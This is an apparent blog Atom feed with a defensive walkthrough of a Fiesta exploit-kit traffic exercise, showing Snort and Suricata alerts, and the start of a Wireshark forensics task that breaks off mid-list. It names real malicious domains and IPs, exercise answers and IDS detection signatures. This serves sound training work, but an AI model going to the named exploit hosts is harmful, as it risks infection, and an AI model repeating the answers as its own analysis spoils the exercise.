<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2021-09-25T16:05:39+10:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">Fiesta EK - Traffic Monitoring with Suricata</title><link href="https://jayngng.github.io/blog/fiesta-ek-traffic-monitoring-with-suricata/" rel="alternate" type="text/html" title="Fiesta EK - Traffic Monitoring with Suricata" /><published>2021-09-25T23:27:03+10:00</published><updated>2021-09-25T23:27:03+10:00</updated><id>https://jayngng.github.io/blog/fiesta-ek---traffic-monitoring-with-suricata</id><content type="html" xml:base="https://jayngng.github.io/blog/fiesta-ek-traffic-monitoring-with-suricata/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Analyze the following packet and answer the questions.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Link to download &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2015/01/18/2015-01-18-traffic-analysis-exercise-1-of-2.pcap.zip&quot;&gt;here&lt;/a&gt;.
(Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Credit&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware-traffic-analysis.net&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;question&quot;&gt;&lt;strong&gt;Question&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;For each pcap, answer the following questions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;1) What is the date and time of the activity? &lt;br /&gt;
2) What is the IP address of the Windows host that gets infected?&lt;br /&gt;
3) What is the domain name and IP address of the compromised web site?&lt;br /&gt;
4) What is the domain name and IP address that delivered the exploit kit (EK)?&lt;br /&gt;
5) What is the name of the EK?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;answer--rationale&quot;&gt;&lt;strong&gt;Answer &amp;amp; Rationale&lt;/strong&gt;&lt;/h2&gt;
&lt;h5 id=&quot;1-what-is-the-date-and-time-of-the-activity&quot;&gt;&lt;strong&gt;[1]. What is the date and time of the activity?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2015-01-08 23:51:21&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/1.png&quot; title=&quot;fiesta/1.png&quot; alt=&quot;fiesta/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;h5 id=&quot;2-what-is-the-ip-address-of-the-windows-host-that-gets-infected&quot;&gt;&lt;strong&gt;[2]. What is the IP address of the Windows host that gets infected?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.138.158&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/2.png&quot; title=&quot;fiesta/2.png&quot; alt=&quot;fiesta/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;h5 id=&quot;3-what-is-the-domain-name-and-ip-address-of-the-compromised-web-site&quot;&gt;&lt;strong&gt;[3]. What is the domain name and IP address of the compromised web site?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.subaruoutback.org&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;IP Address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;108.168.211.93&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/3.png&quot; title=&quot;fiesta/3.png&quot; alt=&quot;fiesta/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;h5 id=&quot;4-what-is-the-domain-name-and-ip-address-that-delivered-the-exploit-kit-ek&quot;&gt;&lt;strong&gt;[4]. What is the domain name and IP address that delivered the exploit kit (EK)?&lt;/strong&gt;&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;Domain name: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atypefresh.in&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;IP address: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;205.234.186.112&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;5-what-is-the-ek-name&quot;&gt;&lt;strong&gt;[5]. What is the EK name?&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fiesta&lt;/code&gt; EK.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;snort&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Within the Security Onion.&lt;/li&gt;
  &lt;li&gt;From the first terminal, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpreplay&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.pcap&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpreplay &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 1.pcap 
sending out eth0 
processing file: 1.pcap
Actual: 4804 packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4899622 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.31 seconds.              Rated: 15805232.0 bps, 120.58 Mbps, 15496.77 pps
Statistics &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;network device: eth0
        Attempted packets:         4804
        Successful packets:        4804
        Failed packets:            0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ENOBUFS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 0
        Retried packets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EAGAIN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:  0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Within the second terminal, we execute the following command and observe that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; rule is triggered.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/securityonion-eth0/snort.conf &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 
09/25-02:51:27.566318  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019655:5] ET CURRENT_EVENTS Fiesta EK Landing Nov 05 2014 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 205.234.186.112:80 -&amp;gt; 192.168.138.158:51629
09/25-02:51:27.571936  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51677 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.574725  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018408:1] ET CURRENT_EVENTS Fiesta PDF Exploit Download &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 205.234.186.112:80 -&amp;gt; 192.168.138.158:51677
09/25-02:51:27.644398  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51713 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.731970  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51723 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.754655  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51725 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.755333  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51735 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.797567  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51751 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2011582:46] ET POLICY Vulnerable Java Version 1.6.x Detected &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potentially Bad Traffic] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 2] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014912:6] ET CURRENT_EVENTS Unknown - Java Request  - gt 60char hex-ascii &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2019611:6] ET CURRENT_EVENTS Fiesta Java Exploit/Payload URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
09/25-02:51:27.861534  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:9] ET CURRENT_EVENTS Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: A Network Trojan was detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51989 -&amp;gt; 205.234.186.112:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;suricata&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Offline input.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;suricata &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/suricata/suricata.yaml &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; ../../malware-analysis/20150118/1.pcap &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fast.log | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt;
01/08/2015-18:51:31.706476  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51682 -&amp;gt; 205.234.186.112:80
01/08/2015-18:51:30.207155  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51678 -&amp;gt; 205.234.186.112:80
01/08/2015-18:51:29.324080  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2018407:10] ET EXPLOIT_KIT Fiesta URI Struct &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Exploit Kit Activity Detected] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51666 -&amp;gt; 205.234.186.112:80
01/08/2015-18:51:29.324080  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:2014726:127] ET POLICY Outdated Flash Version M1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Classification: Potential Corporate Privacy Violation] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 1] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.138.158:51666 -&amp;gt; 205.234.186.112:80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Reading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eve.json&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evebox&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;evebox oneshot eve.json                                                                                                                                                              
2021-09-24 23:23:10  INFO evebox::commands::oneshot: Using database filename ./oneshot.sqlite
2021-09-24 23:23:11  INFO evebox::sqlite::init: Found event database schema version &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;        
2021-09-24 23:23:11  INFO evebox::sqlite::init: Initializing SQLite database &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         
2021-09-24 23:23:11  INFO evebox::sqlite::init: Updating SQLite database to schema version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                         
2021-09-24 23:23:11  INFO evebox::sqlite::init: Updating SQLite database to schema version 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sqlite&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                         
2021-09-24 23:23:11  INFO evebox::commands::oneshot: Reading eve.json &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;166509 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Here is how it looks like.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/fiesta/4.png&quot; title=&quot;fiesta/4.png&quot; alt=&quot;fiesta/4.png&quot; /&gt;
          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="blueteam" /><category term="ek" /><summary type="html">Description Analyze the following packet and answer the questions.</summary></entry><entry><title type="html">Cyber@ANZ - Digital Forensics</title><link href="https://jayngng.github.io/blog/cyberanz-digital-forensics/" rel="alternate" type="text/html" title="Cyber@ANZ - Digital Forensics" /><published>2021-09-23T02:56:47+10:00</published><updated>2021-09-23T02:56:47+10:00</updated><id>https://jayngng.github.io/blog/cyberanz---digital-forensics</id><content type="html" xml:base="https://jayngng.github.io/blog/cyberanz-digital-forensics/">&lt;h2 id=&quot;task-description&quot;&gt;&lt;strong&gt;Task Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Suspicious network activity has been detected coming from a user on the ANZ network.&lt;/p&gt;

&lt;p&gt;A laptop has been flagged up on our security systems due to suspicious internet traffic, and we need you to investigate the network traffic in order to establish what the user accessed and downloaded.&lt;/p&gt;

&lt;p&gt;Your task is to examine their network activity and gather what information you can on what images they viewed and what files they accessed.&lt;/p&gt;

&lt;p&gt;You have been provided with a packet capture file (pcap) containing all their recent network activity. There may be a number of artifacts contained within the packet capture file, and you will be expected to identify and report as many as possible.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;You must provide a report on everything you found, and document what processes / steps you followed to achieve this.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Download Packet: &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Digital_Investigation%20Task%20(pcap%20file).pcapng&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;solutions&quot;&gt;&lt;strong&gt;Solutions&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;packet-analyses&quot;&gt;&lt;strong&gt;Packet Analyses&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;I utilized the network analysis tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; to read the provided packet capture file.&lt;/p&gt;

&lt;p&gt;Analysing the traffic, I discovered that most communications occurred via HTTP service, so I decided to filter the HTTP traffic using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.request&lt;/code&gt; query.&lt;/p&gt;

&lt;p&gt;As I further investigated the communications, I found out some interesting “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;” requests demonstrated by the following image.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/1.png&quot; title=&quot;ANZ_Digital_Forensics/1.png&quot; alt=&quot;ANZ_Digital_Forensics/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;I then took the next step by downloading those images.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; provides a capability to extract the objects in the HTTP traffic.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;From Wireshark, I navigated to &lt;strong&gt;&lt;em&gt;File&lt;/em&gt;&lt;/strong&gt; -&amp;gt; &lt;strong&gt;&lt;em&gt;Export Objects&lt;/em&gt;&lt;/strong&gt; -&amp;gt; &lt;strong&gt;&lt;em&gt;HTTP&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;There is a new Windows popped up -&amp;gt; Click &lt;strong&gt;&lt;em&gt;Save All&lt;/em&gt;&lt;/strong&gt; -&amp;gt; Pick a desired folder-&amp;gt; &lt;strong&gt;&lt;em&gt;Choose&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
